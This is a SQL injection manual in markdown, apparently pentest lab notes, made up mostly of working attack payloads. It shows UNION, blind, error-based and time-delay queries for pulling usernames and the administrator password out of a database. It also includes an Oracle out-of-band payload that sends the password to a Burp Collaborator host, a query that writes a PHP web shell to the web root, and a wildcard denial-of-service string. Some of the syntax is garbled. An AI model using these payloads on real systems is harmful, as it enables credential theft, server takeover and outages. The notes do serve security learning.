
# SQL Injection Manual

SQL injection is a type of injection attack where attacker injects arbitrary SQL queries into database server using input options


## Important Note

SQL Version and program can be different in different sites
Like MySQL  , PostGrsql , Oracle , MsSQL etc. So the syntax is also different in them. [FOLLOW THIS FOR TESTING](https://portswigger.net/web-security/sql-injection/cheat-sheet)




## CURD Operation In SQL 

Create (INSERT):

```sql
  INSERT INTO table_name (column1, column2, ...) VALUES (value1, value2, ...)
  INSERT INTO customers (name, email, phone) VALUES ('John Doe', 'john@example.com', '123456789')
```

Read (SELECT):

```sql
  SELECT column1, column2, ... FROM table_name WHERE condition
  SELECT * FROM customers WHERE uid = 1
```

Update (UPDATE):

```sql
  UPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition
  UPDATE customers SET email = 'newemail@example.com' WHERE id = 1
```

Delete (DELETE):

```sql
    DELETE FROM table_name WHERE condition
    DELETE FROM customers WHERE id = 1
```


## SQL Injection Detection and confirmation



```SQL
  # Error Based PAYLOADS [;,--,',",#]
  name=hacker'

  # Condition Based Detection
  name=hacker'and 1=1-- (Sucess Execution)
  select name from users where id=1 and 1=1;--;

  name=hacker'and 1=2-- (Failed  Execution)
  select name from users where id=1 and 1=2;--;


  email=newemial@gmail.com' WHERE id= {not_yours};--
  UPDATE customers SET email = 'newemail@example.com' WHERE id = -1 ;--
  # Blind Based PAYLOADS
  email=test@emial.com' WAITFOR DELAY '0:0:10'--

  
```
#### Easy Detect By
```bash
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'   <== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
```
## Exploitation

### How Union Works

```sql
# Union is used to concatinate two queries into 1 result and show it to user
Select Column1 , Column2 from table1 Union select column3 and column4 from table2
# This Will Concatinate Column1,Column2,Column3,Column4 at One result
# Rule to make union work 
(i) Number of columns should be same in two tables
(ii) Datatypes must be same

# So to determine number of columns called in f++
++irst query we will use
select ?(don't know) from table1 UNION select NULL
# if the number of column mismatch we will get an error and we have to try again
select ?(don't know) from table1 UNION select NULL,NULL'NULL
# Until we get to know how many columns are called
```

### How to use order by instead of Union

```sql
SELECT col1 and col2 from tab1 order by 1
# This will order by col1 
SELECT col1 and col2 from tab1 order by 2
# This will order by col2


So If We Put Invalid Column Number Just Like :
SELECT col1 and col2 from tab1 order by 3
# We Will get an error and WE WILL GET TO KNOW THE NUMBER OF COLUMNS
```

### Find a column with text datatype

```sql
# we got to know how to find number of columns now time to find the datatype of the column
Gifts' union select NULL,NULL,NULL--'
Now if we do Gifts' union select 'ls',NULL,NULL--'
this will print ls in that column prinitng section if datatype is same 
```

### Retriving data into that column

```sql
Now if we do Gifts' union select username,NULL,NULL from users--'
then Gifts' union select password,NULL,NULL from users--'
```

### Display the versions of database

```sql
Oracle	SELECT banner FROM v$version
SELECT version FROM v$instance
Microsoft	SELECT @@version
PostgreSQL	SELECT version()
MySQL	SELECT @@version
```

- — comment bypass is # or %23
- Use version commands to determine the database type and version every single time
- Get the table names
- if you get error include from keyword in select statement to overcome it

```sql
Gifts' union select table_name, null FROM all_tables--
SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
Select table_name from information_schema.tables—
```
- Get Columns
```sql
Gifts'union select column_name,null FROM information_schema.columns WHERE table_name = 'users_dlawil

```

 
## Blind SQLi

### With Conditional Statements
```sql
# CHeck If Blind SQLi Exists
' and 1=1-- # will return True
' and 1=2-- # will return false 
# If above the case most likely vulnerable


# Determining The Table Name
' and (SELECT 'x' from users LIMIT 1)='x'-- # bruteforce user parameter
# Check The USername Exists Or Not
' and (SELECT username from users where username='administrator')='administrator'--

# Determine The Length Of Password
' and (SELECT username from users where username='administrator' and LENGTH(password)>10)='administrator'--
itrate the LENGTH 10 With Intruder to validate number of characters

# What is the first character of password
' and (SELECT substring(password,1,1) from users where username='administrator')='j'--;
#itrate j for correct response

# what is the second character
' and (SELECT substring(password,2,1) from users where username='administrator')='j'--;
#itrate j for correct response
```

### With Error On Wrong Syntax / Conditinal error (1=2)
- How SQL Works : From Claus Executes first that i mean by that is
```sql
SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) ||';
If the dual database exist run select statement

SImilarly : 
SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator' and LENGTH(password)>1)

from users where username='administrator' and LENGTH(password)>1) # If this id true
Run : (1=1) THEN TO_CHAR(1/0) # WAnt to get error

from users where username='administrator' and LENGTH(password)>50) # If this is false
# dont run 1=1) THEN TO_CHAR(1/0) 

# if it were 1=0 it will cancel out entire statement
```

```sql
# Proof That The Parameter Is Vulnerable
ADD ' (get Error) add '' and error gone
TrackingId=X6sPMMZQn3eB3frL' --> Error
TrackingId=X6sPMMZQn3eB3frL'' --> Error Gone

# Check If Exploitation Is Possible
TrackingId=X6sPMMZQn3eB3frL'|| (select '') ||'; # mysql etc
TrackingId=X6sPMMZQn3eB3frL'|| (select '' from dual) ||'; # for oracle
'|| (select '' from dontexist) ||'; # if this gives error Injection confirmed

# Confirm users table exists
'||+(select '' from users where rownum=1)||';

#Confirm Username Exist in database
'|| (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) ||';
Then Do 1=1 Now We Have A Query Based On Condition
'|| (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) ||';
Then Do 1=1 Now We Have A Query Based On Condition

X6sPMMZQn3eB3frL'||+(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+users+where+username%3d'administrator')+||';
X6sPMMZQn3eB3frL'||+(SELECT+CASE+WHEN+(1=0)+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+users+where+username%3d'administrator')+||';
# Whis way we are assigning error + condition to exploit

# Length OF the password
'||+(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM+users+where+username%3d'administrator'+and+LENGTH(password)>1)+||'
# Devide 1/0 And select "" from users where pass > 1


# Display The Admin Password
(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator' and substring(password,1,1)='a')

```

### Visible error to exploit 
```sql
# The CAST function in SQL is used to convert a value from one data type to another
' AND CAST((SELECT 1) AS int)--
It will generate syntax error
# ERROR: argument of AND must be type boolean, not type integer
  Position: 46

' AND 1=CAST((SELECT username FROM users) AS int)
This will output username
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

# We are outputting the credentials through syntax error display message
```

### Testing Blind SQLi With Time Delays
```sql
Oracle :  	    dbms_pipe.receive_message(('a'),10)
Microsoft :  	  WAITFOR DELAY '0:0:10'
PostgreSQL :  	SELECT pg_sleep(10)
MySQL :         SELECT SLEEP(10)

PAYLOAD : '||(QUERY_HERE)--'
PAYLOAD : '||(QUERY_HERE)--'
ex : '+||+(SELECT pg_sleep(10) +)--'
```
### Extract Data Using Time Delays

```sql
Detection : SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
# It is for postgresql Try for all to detect database and all

# CHeck if username exists payload for PG_sql
SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--

# get the length of password
'%3BSELECT+CASE+WHEN+(username='administrator'+and+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+from+users--;
Use Intruder With Resource Pool Set to 1

x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
# itrate using burp intruder to get full passswd

```

### Out Of Band Interaction
```sql
Oracle : 
hE7U87fKPiX6zbQj'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://fq95bvyfk83ofbyg10q59d8l6cc40t.burpcollaborator.net"> %remote;]>'),'/l') FROM dual)--;
Extract data :
' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--


```
## SQLi To RCE
```sql
' UNION SELECT '<?php system($_GET['cmd']); ?>' INTO OUTFILE '/var/www/html/shell.php' #
```
## SQL Wildcard Trick 
- This is the intresting type of feature in SQL
  Remeber using * in linux terminal
  - Just like that SQL supports
    ```bash
    %
    _ (underscore): represents a single character)
    ```
1. eg
```bash
DELETE FROM your_table_name WHERE name = 'victim';
DELETE FROM your_table_name WHERE name = '%user_input%';
```
- What is the issue ?
  If we try to fetch entire database then server might crash causing DOS. Also this can be used in other exploits as well.
- What if we run this in search bar
```bash
%n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n]!%
```
If the database has a large number of records, the query can take a long time to execute, leading to a slow response time or a complete DoS.
- Someone renamed file name to this payload and got a response delay.

